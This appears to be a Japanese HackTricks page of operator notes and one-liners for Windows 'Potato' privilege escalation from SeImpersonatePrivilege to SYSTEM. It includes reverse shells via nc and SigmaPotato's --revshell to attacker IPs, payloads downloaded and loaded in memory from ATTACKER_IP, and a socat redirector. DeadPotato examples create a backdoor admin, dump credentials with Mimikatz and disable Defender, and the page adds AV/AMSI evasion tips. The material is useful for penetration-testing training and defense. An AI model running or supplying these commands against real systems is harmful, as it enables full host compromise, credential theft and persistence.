# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotatoは** Windows Server 2019およびWindows 10 build 1809以降では**動作しません**。ただし、[**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**、** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**、** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**、** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**、** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**、** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)**を使用すると、同じ権限を利用して`NT AUTHORITY\SYSTEM`**レベルのアクセス権を取得できます。この[ブログ記事](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)では、JuicyPotatoが動作しなくなったWindows 10およびServer 2019ホストで偽装権限を悪用できる`PrintSpoofer`ツールについて詳しく解説しています。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> 2024～2025年に頻繁にメンテナンスされている最新の代替手段として、GodPotatoのforkであるSigmaPotatoがあります。インメモリ/.NET reflectionの使用や、OSサポートの拡張が追加されています。使い方の概要は以下を、リポジトリはReferencesを参照してください。

背景知識と手動での手法に関する関連ページ：

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## 要件とよくある注意点

以下の手法はすべて、次のいずれかの権限を持つコンテキストから、偽装可能な特権サービスを悪用します。

- SeImpersonatePrivilege（最も一般的）またはSeAssignPrimaryTokenPrivilege
- トークンにすでにSeImpersonatePrivilegeがある場合、高いintegrityは不要です（IIS AppPoolやMSSQLなど、多くのサービスアカウントでは一般的です）

権限をすばやく確認するには：

```cmd
whoami /priv | findstr /i impersonate
```

運用上の注意:

- シェルが SeImpersonatePrivilege を持たない制限付きトークンで実行されている場合（特定の状況下で Local Service/Network Service によく見られます）、FullPowers を使ってアカウントのデフォルトの権限を復元してから Potato を実行します。例: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- プロセストークンは、同じサービスアカウントやログオンセッションの別のトークンより権限が少ない場合があります。一部の構成では、同一セッションの named-pipe client によって SeImpersonatePrivilege を持つ別のトークンを利用できることがありますが、サービスに設定された `RequiredPrivileges` と `whoami /priv` はそれぞれ異なる内容を示しており、そのようなトークンが利用可能である証明にはなりません。偽装経路を検討する前に、実際のトークンを確認してください。
- PrintSpoofer には、Print Spooler サービスが実行中で、ローカル RPC エンドポイント（spoolss）経由で到達可能である必要があります。PrintNightmare 以降、Spooler が無効化されている強化環境では、RoguePotato/GodPotato/DCOMPotato/EfsPotato を優先してください。
- RoguePotato には、TCP/135 で到達可能な OXID resolver が必要です。外向き通信がブロックされている場合は、redirector/port-forwarder を使用してください（以下の例を参照）。使用するビルドでサポートされているフラグを確認してください。
- EfsPotato/SharpEfsPotato は MS-EFSR を悪用します。1 つの pipe がブロックされている場合は、別の pipe（lsarpc、efsrpc、samr、lsass、netlogon）を試してください。
- RpcBindingSetAuthInfo 中のエラー 0x6d3 は、通常、未知または未サポートの RPC authentication service を示します。別の pipe/transport を試すか、対象のサービスが実行中であることを確認してください。
- DeadPotato のような「kitchen-sink」fork には、ディスクにアクセスする追加の payload module（Mimikatz/SharpHound/Defender off）が含まれています。簡素なオリジナルと比べて、EDR に検知される可能性が高くなります。

## Quick Demo

### PrintSpoofer

```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```

注意:
- `-i` を使うと現在のコンソールで対話型プロセスを起動できます。または `-c` を使ってワンライナーを実行できます。
- Spooler サービスが必要です。無効になっている場合、これは失敗します。

### RoguePotato

```bash
c:\RoguePotato.exe -r 10.10.10.10 -e "cmd.exe /c whoami" -l 9999
```

[upstream usage](https://github.com/antonioCoco/RoguePotato#usage)では、`-e`でコマンドを指定し、`-l`でローカルのresolverポートを選択します。任意の`-c`ではCLSIDを選択します。COMのactivationによって、実行ファイルのパスがすでに変更されたサービスが起動した場合、そのサービスはtoken impersonationとは無関係に、変更後のコマンドを実行できます。観測されたSYSTEM実行をこの手法によるものと判断する前に、サービスの設定を確認してください。

アウトバウンドの135がブロックされている場合は、redirector上のsocatでOXID resolverを中継します。<sup>[[9]](#references)</sup>

```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```

### PrintNotifyPotato

PrintNotifyPotatoは、Spooler/BITSではなく**PrintNotify** serviceを標的とする、2022年後半に公開された新しいCOM abuse primitiveです。このbinaryはPrintNotify COM serverをインスタンス化し、偽の`IUnknown`に差し替えた後、`CreatePointerMoniker`を通じて特権付きcallbackをトリガーします。**SYSTEM**として実行されているPrintNotify serviceが接続し返すと、プロセスは返されたtokenを複製し、指定されたpayloadを完全な権限で起動します。<sup>[[13]](#references)</sup>

主な運用上の注意事項:

* Print Workflow/PrintNotify serviceがインストールされていれば、Windows 10/11およびWindows Server 2012–2022で動作します（PrintNightmare以降、従来のSpoolerが無効になっていても存在します）。
* 呼び出し元のコンテキストに**SeImpersonatePrivilege**が必要です（IIS APPPOOL、MSSQL、スケジュールされたタスクのservice accountなどで一般的です）。
* 直接コマンドを渡す方法と、元のコンソール内にとどまれるinteractive modeのどちらも利用できます。例:

  ```cmd
  PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
  PrintNotifyPotato.exe whoami
  ```

* 純粋にCOMベースのため、名前付きパイプのリスナーや外部リダイレクターは不要です。そのため、DefenderがRoguePotatoのRPCバインディングをブロックするホストで、すぐに置き換えて使用できます。

Ink Dragonなどのオペレーターは、SharePointでViewState RCEを獲得した直後にPrintNotifyPotatoを実行し、`w3wp.exe`ワーカーからSYSTEMへピボットしてからShadowPadをインストールします。<sup>[[14]](#references)</sup>

### SharpEfsPotato

```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```

### EfsPotato

```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```

ヒント: あるパイプが失敗する、またはEDRにブロックされる場合は、もう一方の対応しているパイプを試してください。

```text
EfsPotato <cmd> [pipe]
  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```

### GodPotato

```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

注意:
- SeImpersonatePrivilege が存在する場合、Windows 8/8.1～11 および Server 2012～2022 で動作します。
- インストール済みruntimeに合ったバイナリを取得してください（例：最新の Server 2022 では `GodPotato-NET4.exe`）。
- 最初の実行手段がwebshell/UIでタイムアウトが短い場合は、payloadをスクリプトとして配置し、長いインラインコマンドではなく、GodPotatoにそのスクリプトを実行させてください。<sup>[[12]](#references)</sup>

書き込み可能なIIS webrootからの簡単なステージング手順:

```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotatoは、デフォルトでRPC_C_IMP_LEVEL_IMPERSONATEに設定されているサービスのDCOMオブジェクトを標的とする2種類のバリアントを提供します。付属のバイナリをビルドまたは使用して、コマンドを実行してください。

```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```

### SigmaPotato (更新版 GodPotato fork)

SigmaPotatoは、.NET reflectionによるメモリ内実行やPowerShell reverse shell helperなど、最新の便利な機能を追加します。<sup>[[8]](#references)</sup>

```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```

2024〜2025年ビルド（v1.2.x）の追加特典:
- reverse shell用の組み込みフラグ`--revshell`と、1024文字のPowerShell制限の撤廃により、AMSI-bypass payloadを長くして一度に実行できます。
- Reflectionに対応した構文（`[SigmaPotato]::Main()`）に加え、`VirtualAllocExNuma()`を使って単純なヒューリスティックをかわす基本的なAV evasionの手法。
- PowerShell Core環境向けに、.NET 2.0を対象にコンパイルされた`SigmaPotatoCore.exe`。

### DeadPotato（2024年のGodPotato再構成版、モジュール付き）

DeadPotatoはGodPotatoのOXID/DCOM impersonation chainを維持しつつ、post-exploitation helperを組み込んでいるため、追加のツールなしですぐにSYSTEMを取得し、persistenceやcollectionを実行できます。<sup>[[15]](#references)</sup>

一般的なモジュール（すべてSeImpersonatePrivilegeが必要）:

- `-cmd "<cmd>"` — 任意のコマンドをSYSTEMとして起動。
- `-rev <ip:port>` — 手軽なreverse shell。
- `-newadmin user:pass` — persistence用にローカル管理者を作成。
- `-mimi sam|lsa|all` — Mimikatzを配置して実行し、認証情報をダンプ（ディスクに書き込むため、目立つ）。
- `-sharphound` — SYSTEMとしてSharpHoundのcollectionを実行。
- `-defender off` — Defenderのリアルタイム保護を無効化（非常に目立つ）。

ワンライナーの例:

```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```

追加のバイナリが含まれているため、AV/EDR に検知されやすくなることが予想されます。ステルス性が重要な場合は、より軽量な GodPotato/SigmaPotato を使用してください。

## References

- [1] [PrintSpoofer – Windows 10 および Server 2019 での Impersonation Privileges の悪用](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [JuicyPotato はもう使えない？古い話です。RoguePotato の登場です](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – サービスアカウントのデフォルトのトークン権限を復元する](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP NTLM leak → webroot への NTFS junction → FullPowers + GodPotato による SYSTEM 権限の取得](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — LibreOffice マクロ → IIS webshell → GodPotato による SYSTEM 権限の取得](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Ink Dragon の内部：ステルス性の高い攻撃作戦における中継ネットワークと内部動作の解明](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – post-ex モジュールを内蔵した GodPotato の改良版](https://github.com/lypd0/DeadPotato)
{{#include ../../banners/hacktricks-training.md}}
